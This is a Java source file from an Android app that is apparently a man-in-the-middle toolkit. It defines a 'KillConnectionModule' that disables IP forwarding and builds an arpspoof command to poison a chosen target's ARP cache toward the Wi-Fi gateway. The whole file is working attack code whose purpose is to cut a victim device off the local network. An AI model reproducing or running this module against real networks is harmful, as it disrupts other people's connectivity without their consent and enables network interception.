package it.uniroma2.giadd.aitm.models;

import android.content.Context;
import android.util.Log;

import java.net.SocketException;
import java.util.List;

import it.uniroma2.giadd.aitm.utils.NetworkUtils;

/**
 * Created by Alessandro Di Diego on 13/08/16.
 */

public abstract class KillConnectionModule extends MitmModule {

    private static final String TAG = KillConnectionModule.class.getName();
    private static final String ARP_SPOOF_COMMAND = "arpspoof -i <interface> -t <target> <default gateway> &";

    public KillConnectionModule(Context context, String target, List<String> additionalCommands) throws SocketException {
        super(additionalCommands);

        // disable forwarding to block connection
        addKernelRoutingCommand(false);

        // spoof client connection to gateway
        String command = context.getFilesDir() + "/" + ARP_SPOOF_COMMAND;
        String interfaceName = NetworkUtils.getActiveInterface(context);
        if (interfaceName == null) {
            Log.e(TAG, "Unable to get interface name!");
            interfaceName = "wlan0";
        }
        command = command.replaceAll("<interface>", interfaceName);
        command = command.replaceAll("<target>", target);
        String gateway = NetworkUtils.getWifiGateway(context);
        if (gateway == null) {
            Log.e(TAG, "Unable to get wifi gateway!");
            gateway = "";
        }
        command = command.replaceAll("<default gateway>", gateway);
        commands.add(command);
    }

}
